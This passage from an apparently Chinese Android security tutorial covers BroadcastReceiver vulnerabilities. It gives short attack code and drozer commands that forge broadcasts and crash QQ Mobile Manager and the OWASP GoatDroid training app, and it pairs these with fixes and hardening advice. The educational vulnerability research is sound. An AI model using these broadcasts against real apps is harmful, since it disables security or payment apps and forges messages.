b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">设置为签名验证</span><br><span class="line">android:protectionLevel=&quot;signature&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.umeng.message.UmengMessageBootReceiver&quot;</span> <span class="attr">android:protectionLevel</span>=<span class="string">&quot;signature&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-拒绝服务"><a href="#4-拒绝服务" class="headerlink" title="4.拒绝服务"></a>4.拒绝服务</h3><h4 id="（1）漏洞介绍-1"><a href="#（1）漏洞介绍-1" class="headerlink" title="（1）漏洞介绍"></a>（1）漏洞介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。</span><br><span class="line">拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现-3"><a href="#（2）漏洞复现-3" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQ手机管家拒绝服务漏洞</a></p>
<p>漏洞描述：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">恶意软件发送一个消息就可以轻松让QQ手机管家拒绝服务，安全防护完全失灵。</span><br><span class="line">com.tencent.qqpimsecure.service.InOutCallReceiver这个广播组件没有对消息进行校验，导致空消息造成<span class="literal">null</span> point问题，直接crash.</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);         </span><br><span class="line">i.setComponent(componetName);       </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/12.png" alt="image-20210912155436267"></p>
<p>案例2：fourgoats.apk拒绝服务攻击崩溃</p>
<p>我们首先用drozer测试可导出组件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/13.png" alt="image-20210912155436267"></p>
<p>我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/14.png" alt="image-20210912155436267"></p>
<p>我们发送恶意广播:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action 广播名 --extra string name lisi</span><br></pre></td></tr></table></figure>

<p>在此之前，我们在AndroidManifest.xml文件里面获取广播名：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/15.png" alt="image-20210912155436267"></p>
<p>我们发送恶意广播：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber <span class="number">1234</span> --extra string message dog</span><br></pre></td></tr></table></figure>

<p>可以发现我们恶意广播发送成功</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/16.png" alt="image-20210912155436267"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/17.png" alt="image-20210912155436267"></p>
<p>我们再向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action &lt;action&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/18.png" alt="image-20210912155436267"></p>
<p>我们就成功完成一次拒绝服务攻击</p>
<p>修复：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">空指针异常</span><br><span class="line">类型转换异常</span><br><span class="line">数组越界访问异常</span><br><span class="line">类未定义异常</span><br><span class="line">其他异常</span><br><span class="line"></span><br><span class="line"><span class="comment">//Serializable：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="built_in">this</span>.getIntent();</span><br><span class="line"><span class="keyword">if</span>(i.getAction().equals(“serializable_action”))&#123;</span><br><span class="line"></span><br><span class="line">  i.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);<span class="comment">//未做异常判断</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Parcelable:</span></span><br><span class="line"><span class="built_in">this</span>.b=(RouterConfig)<span class="built_in">this</span>.getIntent().getParcelableExtra(“filed_router_config”);<span class="comment">//引发转型异常崩溃</span></span><br><span class="line"></span><br><span class="line">谨慎处理接收的intent以及其携带的信息。</span><br><span class="line">对接收到的任何数据做<span class="keyword">try</span> <span class="keyword">catch</span>处理，以及对不符合预期的数据做异常处理。</span><br></pre></td></tr></table></figure>

<p>拒绝服务攻击可以参考Activity的拒绝服务攻击和Service的拒绝服务攻击</p>
<h2 id="四、Broadcast-Reciver的安全防护"><a href="#四、Broadcast-Reciver的安全防护" class="headerlink" title="四、Broadcast Reciver的安全防护"></a>四、Broadcast Reciver的安全防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）私有广播接收器设置exported=’<span class="literal">false</span>’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</span><br><span class="line">（<span class="number">2</span>）对接收来的广播进行验证。</span><br><span class="line">（<span class="number">3</span>）内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。</span><br><span class="line">（<span class="number">4</span>）返回结果时需注意接收app是否会泄露信息。</span><br><span class="line">（<span class="number">5</span>）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</span><br><span class="line">（<span class="number">6</span>）使用LocalBroadcastManager。</span><br></pre></td></tr></table></figure>

<h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文主要介绍了Android中广播机制的运行原理，并对Android广播机制中的常见漏洞做了一个初步的总结，我们可以发现Android的四大组件的漏洞原理基本存在很大的相关性，在拒绝服务攻击中，这里用了一个简易的样本，并逐步实现了拒绝服务攻击的步骤，本文可能还存在很多不足，后续逐步完善，也欢迎各位大佬指正。</p>
<h2 id="六、参考网址"><a href="#六、参考网址" class="headerlink" title="六、参考网址"></a>六、参考网址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Android第一行代码</span><br><span class="line">https://www.jianshu.com/p/ca3d87a4cdf3</span><br><span class="line">https://blog.csdn.net/q376794191/article/details/85292952</span><br><span class="line">https://www.cnblogs.com/lwbqqyumidi/p/4168017.html</span><br><span class="line">https://www.jianshu.com/p/c1a826a5beea</span><br><span class="line">https://www.jianshu.com/p/e236a2669797</span><br><span class="line">https://www.jianshu.com/p/e236a2669797</span><br><span class="line">https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/</span><br><span class="line">https://tea9.xyz/post/962818054.html</span><br><span class="line">https://paper.seebug.org/papers/Archive/drops2/Android%20Broadcast%20Security.html</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>安全后厨团队 |  微信公众号【安全后厨】
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://security-kitchen.com/2023/02/13/bug0011/" title="Android App漏洞之战（11）——Broadcast Recevier漏洞详解">http://security-kitchen.com/2023/02/13/bug0011/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/13/bug0010/" rel="prev" title="Android App漏洞之战（10）——Service漏洞挖掘详解">
      <i class="fa fa-chevron-left"></i> Android App漏洞之战（10）——Service漏洞挖掘详解
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/13/bug0012/" rel="next" title="Android App漏洞之战（12）——Content Provider漏洞详解">
      Android App漏洞之战（12）——Content Provider漏洞详解 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Broadcast-Recevier%E5%88%9D%E6%AD%A5%E4%BB%8B%E7%BB%8D"><span class="nav-text">二、Broadcast Recevier初步介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Broadcast-Recevier%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">1.Broadcast Recevier的基本原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6%E7%AE%80%E4%BB%8B"><span class="nav-text">（1）广播机制简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">（2）广播机制应用场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6%E6%A8%A1%E5%9E%8B%E7%90%86%E8%A7%A3"><span class="nav-text">（3）广播机制模型理解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-text">（4）广播机制的使用流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Broadcast-Reciver%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%A7%8D%E7%B1%BB%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="nav-text">2.Broadcast Reciver漏洞的种类和危害</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Broadcast-Reciver%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">三、Broadcast Reciver漏洞原理分析和复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E"><span class="nav-text">1.敏感信息泄漏漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.权限绕过漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-1"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B6%88%E6%81%AF%E4%BC%AA%E9%80%A0"><span class="nav-text">3.消息伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-text">（1）漏洞介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="nav-text">4.拒绝服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-1"><span class="nav-text">（1）漏洞介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Broadcast-Reciver%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">四、Broadcast Reciver的安全防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-text">五、实验总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%8F%82%E8%80%83%E7%BD%91%E5%9D%80"><span class="nav-text">六、参考网址</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="安全后厨团队"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">安全后厨团队</p>
  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">52</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/WindXaa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;WindXaa" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://bbs.pediy.com/user-home-905443.htm" title="看雪 → https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm" rel="noopener" target="_blank"><i class="gratipay fa-fw"></i>看雪</a>
      </span>
  </div>



      </div>
	  
	  <div class="wechat_OA">
		<span><b>公众号</b></span>
		<br>
		<!-- 这里添加你的二维码图片 -->
		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/weChat.jpg" alt="二维码">
	  </div>
	  <div class="wechat_OA">
		<span><b>知识星球</b></span>
		<br>
		<!-- 这里添加你的二维码图片 -->
		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website%2Fstar.png" alt="知识星球">
	  </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022-12 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">安全后厨团队</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>
<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共189.4k字</span>
</div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
